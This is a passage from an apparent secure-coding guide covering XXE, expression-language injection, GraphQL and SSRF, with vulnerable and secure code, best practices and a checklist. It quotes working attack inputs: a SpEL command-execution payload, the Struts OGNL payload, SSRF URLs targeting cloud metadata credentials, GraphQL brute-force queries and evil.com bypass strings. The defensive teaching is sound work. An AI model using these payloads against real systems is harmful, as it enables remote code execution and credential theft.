factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
```

```go
// SECURE: Go's encoding/xml does not process external entities by default
// The standard library is safe. Do NOT use custom parsers that add entity resolution.
import "encoding/xml"

type User struct {
    XMLName xml.Name `xml:"user"`
    Name    string   `xml:"name"`
}

func parseUserXML(data []byte) (*User, error) {
    var user User
    err := xml.Unmarshal(data, &user)
    return &user, err
}
```

### Defense Layers for XXE

1. **Disable DTD processing entirely** -- the most effective defense. If you do not need DTDs, disable them.
2. **Disable external entity resolution** -- prevent the parser from fetching files or URLs.
3. **Use JSON instead of XML** -- JSON has no entity processing mechanism. If your API can accept JSON, prefer it.
4. **Validate and sanitize XML input** -- reject documents containing `<!DOCTYPE` or `<!ENTITY` declarations.
5. **Limit parser resource consumption** -- set maximum entity expansion limits to prevent Billion Laughs.

---

## 11. Expression Language Injection (CWE-917)

**What it is:** An attacker injects expressions into evaluation engines such as Spring Expression Language (SpEL), OGNL (Apache Struts), or MVEL. These expression languages can access Java runtime objects, enabling remote code execution.

**Impact:** Remote code execution, full server compromise. The Apache Struts OGNL injection (CVE-2017-5638, the Equifax breach) is the most notorious example.

### Attack Anatomy

```
Spring SpEL:
  User input: ${T(java.lang.Runtime).getRuntime().exec('id')}
  -- Executes system command via Java runtime

OGNL (Struts):
  Content-Type: %{(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}
  -- The Struts exploit that compromised Equifax
```

### Vulnerable Code

```java
// VULNERABLE: User input evaluated as SpEL expression
import org.springframework.expression.spel.standard.SpelExpressionParser;

public Object evaluate(String userExpression) {
    SpelExpressionParser parser = new SpelExpressionParser();
    // NEVER DO THIS -- user controls the expression
    return parser.parseExpression(userExpression).getValue();
}
```

### Secure Code

```java
// SECURE: Use SimpleEvaluationContext to restrict expression capabilities
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;

public Object evaluateSafely(String userExpression, Map<String, Object> variables) {
    SpelExpressionParser parser = new SpelExpressionParser();

    // SimpleEvaluationContext disallows:
    //   - Type references (no T(java.lang.Runtime))
    //   - Constructor calls (no new ProcessBuilder())
    //   - Bean references
    //   - Static method calls
    SimpleEvaluationContext context = SimpleEvaluationContext
        .forReadOnlyDataBinding()
        .withInstanceMethods()  // Only instance methods on provided objects
        .build();

    // Set only the variables the expression is allowed to access
    variables.forEach(context::setVariable);

    return parser.parseExpression(userExpression).getValue(context);
}

// BEST: Do not evaluate user-supplied expressions at all.
// If you need dynamic behavior, use a whitelist of predefined expressions.
public Object evaluateFromWhitelist(String expressionKey, Map<String, Object> data) {
    Map<String, String> allowedExpressions = Map.of(
        "full_name", "#firstName + ' ' + #lastName",
        "total", "#price * #quantity"
    );

    String expression = allowedExpressions.get(expressionKey);
    if (expression == null) {
        throw new IllegalArgumentException("Unknown expression: " + expressionKey);
    }

    // Evaluate the predefined expression, not user input
    SpelExpressionParser parser = new SpelExpressionParser();
    SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
    data.forEach(context::setVariable);
    return parser.parseExpression(expression).getValue(context);
}
```

### Defense Layers for EL Injection

1. **Never evaluate user-supplied expressions** -- this is the most important rule. If the user needs dynamic output, map user choices to predefined expressions.
2. **Use restricted evaluation contexts** -- `SimpleEvaluationContext` in Spring, custom `SecurityManager` for other engines.
3. **Keep frameworks patched** -- Struts OGNL vulnerabilities (CVE-2017-5638) and Spring4Shell (CVE-2022-22965) are fixed in newer versions.
4. **Remove Struts 2 if possible** -- OGNL has had recurring critical vulnerabilities. Consider migrating to a different framework.

---

## 12. GraphQL Injection

**What it is:** GraphQL APIs are vulnerable to several injection-adjacent attacks: query manipulation (requesting fields the client should not access), batch query attacks (sending thousands of queries in one request), deep nesting attacks (queries with excessive depth that cause performance degradation), and alias-based rate limit bypass.

**Impact:** Data exfiltration via introspection, denial of service via query complexity, rate limit bypass, authorization bypass.

### Vulnerable Code

```typescript
// VULNERABLE: No depth limiting, no complexity analysis, introspection enabled
import { ApolloServer } from "@apollo/server";

const server = new ApolloServer({
  typeDefs,
  resolvers,
  // Default: introspection enabled, no query limits
});

// Attacker sends:
// {
//   user(id: "1") {
//     friends {
//       friends {
//         friends {
//           friends {
//             ... 50 levels deep -- crashes the server
//           }
//         }
//       }
//     }
//   }
// }

// Attacker sends alias-based batch:
// {
//   a1: login(user: "admin", pass: "password1") { token }
//   a2: login(user: "admin", pass: "password2") { token }
//   ... a10000: login(user: "admin", pass: "password10000") { token }
// }
// 10000 login attempts in a single HTTP request -- bypasses rate limiting
```

### Secure Code

```typescript
// SECURE: Depth limiting, complexity analysis, disabled introspection
import { ApolloServer } from "@apollo/server";
import depthLimit from "graphql-depth-limit";
import { createComplexityLimitRule } from "graphql-validation-complexity";

const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: false,  // Disable introspection in production
  validationRules: [
    depthLimit(5),  // Maximum query depth of 5 levels
    createComplexityLimitRule(1000, {
      // Assign complexity cost to fields
      scalarCost: 1,
      objectCost: 10,
      listFactor: 20,  // Lists multiply the child cost
    }),
  ],
  plugins: [
    {
      async requestDidStart() {
        return {
          async didResolveOperation(requestContext) {
            // Count aliases to prevent batch attacks
            const aliasCount = countAliases(requestContext.document);
            if (aliasCount > 10) {
              throw new Error("Too many aliases in query");
            }
          },
        };
      },
    },
  ],
});

// Rate limit at the resolver level, not just HTTP level
const resolvers = {
  Mutation: {
    login: rateLimited({ window: "1m", max: 5 }, async (_, args, context) => {
      // Per-resolver rate limiting catches alias-based batch attacks
      return authenticateUser(args.email, args.password);
    }),
  },
};
```

### Defense Layers for GraphQL

1. **Disable introspection in production** -- attackers use introspection to discover your entire schema.
2. **Enforce query depth limits** -- prevent deeply nested queries that cause N+1 performance issues.
3. **Enforce query complexity limits** -- assign costs to fields and reject queries exceeding the budget.
4. **Limit aliases per query** -- prevent batch attacks that bypass rate limiting.
5. **Implement per-resolver authorization** -- every resolver must check if the current user can access the requested data.
6. **Use persisted queries** -- in production, only allow queries that were pre-registered at build time. Reject arbitrary queries.

---

## 13. SSRF -- Server-Side Request Forgery (CWE-918)

**What it is:** An attacker manipulates a server-side application into making HTTP requests to unintended destinations. The attacker exploits the application's ability to fetch URLs and directs it to internal services, cloud metadata endpoints, or other restricted resources.

**Impact:** Access to cloud metadata credentials (AWS IAM role credentials), internal service discovery, port scanning internal networks, reading internal data, bypassing firewalls.

### Attack Anatomy

```
Application accepts a URL to fetch:
  POST /api/fetch-preview
  Body: { "url": "https://example.com/article" }

Attacker provides:
  { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role" }
  -- Fetches AWS instance metadata, obtains temporary IAM credentials

Other SSRF targets:
  http://169.254.169.254/...              -- AWS metadata (IMDSv1)
  http://metadata.google.internal/...     -- GCP metadata
  http://169.254.169.254/metadata/...     -- Azure metadata
  http://127.0.0.1:6379/                  -- Internal Redis
  http://127.0.0.1:5432/                  -- Internal PostgreSQL
  http://internal-admin.local/admin       -- Internal admin panel

DNS rebinding attack:
  Step 1: Attacker registers evil.com, DNS resolves to 1.2.3.4 (external, passes validation)
  Step 2: Application validates URL, hostname resolves to 1.2.3.4 -- passes check
  Step 3: Application makes the request, but DNS has been updated to resolve to 127.0.0.1
  Step 4: Request goes to localhost, bypassing the validation
```

### Vulnerable Code

```typescript
// VULNERABLE: Fetches any URL the user provides
import axios from "axios";

app.post("/api/fetch-preview", async (req, res) => {
  const url = req.body.url;
  // NEVER DO THIS -- attacker can fetch internal resources
  const response = await axios.get(url);
  const preview = extractPreview(response.data);
  res.json(preview);
});
```

### Secure Code

```typescript
// SECURE: Validate URL, resolve DNS, check against blocklist, enforce IMDSv2
import { URL } from "url";
import dns from "dns/promises";
import https from "https";

// Blocked IP ranges (internal, metadata, loopback, link-local)
const BLOCKED_RANGES = [
  /^127\./,                    // Loopback
  /^10\./,                     // Private Class A
  /^172\.(1[6-9]|2\d|3[01])\./, // Private Class B
  /^192\.168\./,               // Private Class C
  /^169\.254\./,               // Link-local (metadata endpoints)
  /^0\./,                      // Current network
  /^::1$/,                     // IPv6 loopback
  /^fc00:/i,                   // IPv6 unique local
  /^fe80:/i,                   // IPv6 link-local
  /^fd/i,                      // IPv6 unique local
];

const ALLOWED_PROTOCOLS = new Set(["https:"]);

async function isUrlSafe(rawUrl: string): Promise<{ safe: boolean; error?: string }> {
  // Step 1: Parse and validate URL structure
  let parsed: URL;
  try {
    parsed = new URL(rawUrl);
  } catch {
    return { safe: false, error: "Invalid URL" };
  }

  // Step 2: Enforce HTTPS only
  if (!ALLOWED_PROTOCOLS.has(parsed.protocol)) {
    return { safe: false, error: "Only HTTPS URLs are allowed" };
  }

  // Step 3: Reject URLs with authentication credentials
  if (parsed.username || parsed.password) {
    return { safe: false, error: "URLs with credentials are not allowed" };
  }

  // Step 4: Resolve DNS and check against blocked IP ranges
  // This prevents DNS rebinding because we resolve BEFORE making the request
  let addresses: string[];
  try {
    addresses = await dns.resolve4(parsed.hostname);
  } catch {
    return { safe: false, error: "DNS resolution failed" };
  }

  for (const addr of addresses) {
    for (const range of BLOCKED_RANGES) {
      if (range.test(addr)) {
        return { safe: false, error: "URL resolves to blocked IP range" };
      }
    }
  }

  return { safe: true };
}

app.post("/api/fetch-preview", async (req, res) => {
  const rawUrl = req.body.url;
  const validation = await isUrlSafe(rawUrl);

  if (!validation.safe) {
    return res.status(400).json({ error: validation.error });
  }

  try {
    // Use a dedicated HTTP client with strict settings
    const response = await fetch(rawUrl, {
      method: "GET",
      redirect: "error",       // Do not follow redirects (redirect to internal IP)
      signal: AbortSignal.timeout(5000),  // 5 second timeout
      headers: {
        "User-Agent": "PreviewBot/1.0",
      },
    });

    // Limit response size
    const text = await response.text();
    if (text.length > 1_000_000) {
      return res.status(400).json({ error: "Response too large" });
    }

    const preview = extractPreview(text);
    res.json(preview);
  } catch (error) {
    res.status(400).json({ error: "Failed to fetch URL" });
  }
});
```

### Cloud Metadata Protection

```bash
# AWS: Enforce IMDSv2 (requires session token, blocks SSRF via GET)
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-endpoint enabled \
  --http-put-response-hop-limit 1

# IMDSv2 requires a PUT request to get a token, then a GET with the token.
# SSRF attacks typically can only do GET requests, so IMDSv2 blocks them.
```

```yaml
# GCP: Block metadata access from containers
# Kubernetes NetworkPolicy to block metadata endpoint
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-metadata
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 169.254.169.254/32  # Block metadata endpoint
```

### Defense Layers for SSRF

1. **URL validation** -- parse the URL, validate protocol (HTTPS only), reject credentials in URLs.
2. **DNS resolution and IP blocklist** -- resolve the hostname to an IP before making the request. Block private, loopback, and link-local ranges.
3. **Disable redirects** -- a redirect to `http://127.0.0.1` bypasses URL validation. Do not follow redirects, or re-validate the redirect target.
4. **Enforce IMDSv2 on AWS** -- requires a token obtained via PUT, which SSRF cannot typically perform.
5. **Network segmentation** -- the application server should not have network access to internal services it does not need to reach.
6. **Response validation** -- check Content-Type, limit response size, do not return raw responses to the user.

---

## Best Practices

### 1. Parameterize Every Query, Every Time

Use parameterized queries (prepared statements) for all database interactions. This applies to SQL, LDAP, XPath, and any other query language. Never concatenate user input into query strings, regardless of the input source. Data from your own database, config files, and environment variables must also be parameterized -- they may contain attacker-controlled values from prior writes.

### 2. Validate Input at the Boundary

Validate all input at the point it enters the system using strict schemas (Zod, Joi, JSON Schema, Pydantic). Validate type, length, format, range, and allowed characters. Use allowlists (specify what IS allowed) rather than blocklists (specify what is NOT allowed). Blocklists are always incomplete.

### 3. Use the Safest API Available

Prefer APIs that do not invoke interpreters. Use `execFile` instead of `exec`. Use `subprocess.run(["cmd", "arg"])` instead of `subprocess.run("cmd arg", shell=True)`. Use ORM query builders instead of raw SQL strings. Use template variables instead of template compilation with user input.

### 4. Separate Code from Data

The root cause of all injection is mixing the control plane (code, commands, queries) with the data plane (user input). Every defense mechanism -- parameterized queries, argument arrays, template variables -- achieves the same goal: keeping code and data in separate channels.

### 5. Apply Defense in Depth

No single layer is sufficient. Combine input validation + parameterized queries + least privilege database users + WAF rules + output encoding. If one layer fails, the others still protect the system.

### 6. Encode Output for the Target Context

Encode data when inserting it into a different context: HTML encoding for web pages, URL encoding for query strings, JSON encoding for API responses, shell escaping for commands. Use the encoding function specific to the target context, not a generic "sanitize" function.

### 7. Disable Dangerous Features by Default

Disable XML external entity processing. Disable DTD loading. Disable JNDI lookups in logging. Disable introspection in production GraphQL. Disable shell interpretation in subprocess calls. Every feature you disable is an attack surface you eliminate.

### 8. Use Structured Logging

Log with structured formats (JSON) where user input is placed in data fields rather than interpolated into message strings. This prevents log injection and makes logs machine-parseable for security monitoring.

### 9. Maintain an Allowlist Mindset

Allowlists define what IS permitted. Blocklists define what IS NOT permitted. Blocklists are inherently incomplete because attackers will find inputs you did not anticipate. Allowlists are inherently complete because anything not explicitly permitted is rejected.

### 10. Keep Dependencies Updated

Many injection vulnerabilities exist in libraries, not application code. Log4Shell was a library vulnerability. Struts OGNL was a framework vulnerability. Maintain an automated dependency update process (Dependabot, Renovate) and respond to security advisories within SLA.

---

## Anti-Patterns

### 1. Blocklist Filtering Instead of Parameterization

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Attempting to block SQL injection by filtering keywords like SELECT, UNION, DROP | Attackers bypass with encoding, case variations (SeLeCt), comments (SEL/**/ECT), or keywords you forgot | Use parameterized queries. Filtering is not a substitute for parameterization |

### 2. Escaping Instead of Parameterization

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Manually escaping quotes in SQL strings (`input.replace("'", "''")`) instead of using parameterized queries | Edge cases in character encoding (GBK, Shift-JIS), multi-byte sequences, or incomplete escaping lead to bypass | Use parameterized queries. Manual escaping is error-prone and encoding-dependent |

### 3. Trusting Client-Side Validation

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Relying on JavaScript/HTML validation (maxlength, pattern, required) to prevent injection | Attacker bypasses the browser entirely with curl, Postman, or a proxy tool | Validate on the server. Client validation is for UX only |

### 4. Using Raw Query Escape Hatches

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Using ORM raw query methods (`$queryRawUnsafe`, `session.execute(text(...))` without parameters, `db.Raw()` in GORM) with string concatenation | ORM provides safety, but the escape hatch method bypasses it entirely | When using raw queries, always use the parameterized variant. Never concatenate into raw query strings |

### 5. Validating URLs by String Matching

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Checking `url.startsWith("https://safe.com")` to prevent SSRF | Attacker uses `https://safe.com.evil.com` or `https://safe.com@evil.com` -- both pass the string check | Parse the URL with a proper URL parser. Validate the parsed hostname, not the raw string |

### 6. Logging User Input in Message Strings

| Problem | Consequence | Fix |
|---------|-------------|-----|
| `logger.info("User logged in: " + username)` where username contains newlines or JNDI expressions | Log injection (forged entries) or Log4Shell-style remote code execution | Use structured logging. Place user input in data fields, not message strings |

### 7. Disabling Security Features for Convenience

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Setting `shell=True` because the command is "simpler as a string", enabling introspection in production because "we might need it", leaving DTD processing on because "we have never seen an XXE attack" | Every disabled security control is an open attack vector waiting for an attacker | Default to the most restrictive setting. Enable features only when there is a documented requirement |

### 8. Same Credentials for All Environments

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Development, staging, and production use the same database credentials and connection strings | Compromise of development environment grants access to production data. Developers have production credentials on their machines | Separate credentials per environment, stored in a secrets manager, rotated independently |

---

## Enforcement Checklist

### SQL Injection (CWE-89)
- [ ] All SQL queries use parameterized queries or prepared statements
- [ ] No string concatenation, template literals, or format strings in SQL
- [ ] ORM raw query methods ($queryRawUnsafe, db.Raw) are never used with user input
- [ ] Database users follow least privilege -- no superuser connections from applications
- [ ] Dynamic table/column names are validated against an allowlist, never interpolated
- [ ] Linting rules flag string concatenation in SQL contexts (eslint-plugin-security, bandit)

### NoSQL Injection (CWE-943)
- [ ] All MongoDB query inputs are validated with schema validation (Zod, Joi)
- [ ] User input is type-coerced to expected types before use in queries
- [ ] $where, $expr, and mapReduce are not used with user-supplied data
- [ ] MongoDB operator injection ($gt, $ne, $regex) is blocked by input validation

### OS Command Injection (CWE-78)
- [ ] No use of exec(), shell=True, or sh -c with user input
- [ ] Commands are executed with execFile / argument arrays (no shell interpretation)
- [ ] Input to command arguments is validated against strict allowlists
- [ ] Language-native libraries are preferred over shell commands

### LDAP Injection (CWE-90)
- [ ] LDAP filter values are escaped using the library's escaping functions
- [ ] Distinguished name components are escaped per RFC 4514
- [ ] Password verification uses LDAP bind, not filter comparison

### XPath Injection (CWE-643)
- [ ] XPath queries use parameterized variables (XPathVariableResolver)
- [ ] If parameterization is unavailable, input is validated against strict allowlists

### Server-Side Template Injection (CWE-1336)
- [ ] User input is never passed to template compilation functions (from_string, compile)
- [ ] User input is only passed as template variables (render context)
- [ ] Template engines are configured with sandboxing where available
- [ ] Logic-less templates (Mustache) are preferred for user-facing content

### HTTP Header Injection (CWE-113)
- [ ] All values set in HTTP headers are checked for CRLF characters (\r\n)
- [ ] Redirect destinations are validated against an allowlist of permitted hosts
- [ ] Framework-provided redirect methods are used instead of manual header setting

### Log Injection (CWE-117)
- [ ] Structured logging (JSON format) is used for all log output
- [ ] User input in logs is placed in data fields, not interpolated into messages
- [ ] Control characters (newlines, tabs) are stripped from logged user input
- [ ] Log4j JNDI lookups are disabled (Log4j 2.17+ or formatMsgNoLookups=true)

### Email Header Injection (CWE-93)
- [ ] All email header fields reject CRLF characters
- [ ] Email addresses are validated with strict regex or library validation
- [ ] Contact forms do not allow user control over To, CC, or BCC headers

### XML/XXE Injection (CWE-611)
- [ ] DTD processing is disabled in all XML parsers
- [ ] External entity resolution is disabled
- [ ] Entity expansion limits are configured to prevent Billion Laughs
- [ ] JSON is used instead of XML where possible

### Expression Language Injection (CWE-917)
- [ ] User input is never evaluated as SpEL, OGNL, MVEL, or other expression languages
- [ ] If expression evaluation is needed, SimpleEvaluationContext or equivalent is used
- [ ] Struts 2 is updated to latest version or migrated away from

### GraphQL Injection
- [ ] Introspection is disabled in production
- [ ] Query depth limiting is enforced (max 5-10 levels)
- [ ] Query complexity analysis rejects expensive queries
- [ ] Alias count is limited to prevent batch attacks
- [ ] Per-resolver authorization is implemented
- [ ] Persisted queries are used in production

### SSRF (CWE-918)
- [ ] User-supplied URLs are parsed and validated (protocol, hostname, port)
- [ ] DNS resolution is performed before the request, and resolved IPs are checked against blocked ranges
- [ ] Private, loopback, and link-local IP ranges are blocked
- [ ] Redirects are not followed, or redirect targets are re-validated
- [ ] AWS IMDSv2 is enforced on all EC2 instances
- [ ] Cloud metadata endpoints are blocked via network policy

### Cross-Cutting Enforcement
- [ ] Input validation with strict schemas is applied at every API boundary
- [ ] Static analysis tools (semgrep, CodeQL, SonarQube) scan for injection patterns in CI
- [ ] Security linting rules are enforced as mandatory (not warnings, but errors)
- [ ] Dependency scanner (Dependabot, Renovate, Snyk) runs on every PR
- [ ] Penetration testing includes injection testing for all covered categories
- [ ] Security training covers injection prevention for all developers annually

---

## CWE Reference Map

| Injection Type | CWE | OWASP Top 10 |
|----------------|-----|-------------|
| SQL Injection | CWE-89 | A03:2021 Injection |
| NoSQL Injection | CWE-943 | A03:2021 Injection |
| OS Command Injection | CWE-78 | A03:2021 Injection |
| LDAP Injection | CWE-90 | A03:2021 Injection |
| XPath Injection | CWE-643 | A03:2021 Injection |
| Server-Side Template Injection | CWE-1336 | A03:2021 Injection |
| HTTP Header Injection | CWE-113 | A03:2021 Injection |
| Log Injection | CWE-117 | A09:2021 Security Logging and Monitoring Failures |
| Email Header Injection | CWE-93 | A03:2021 Injection |
| XXE (XML External Entity) | CWE-611 | A05:2021 Security Misconfiguration |
| Expression Language Injection | CWE-917 | A03:2021 Injection |
| SSRF (Server-Side Request Forgery) | CWE-918 | A10:2021 Server-Side Request Forgery |
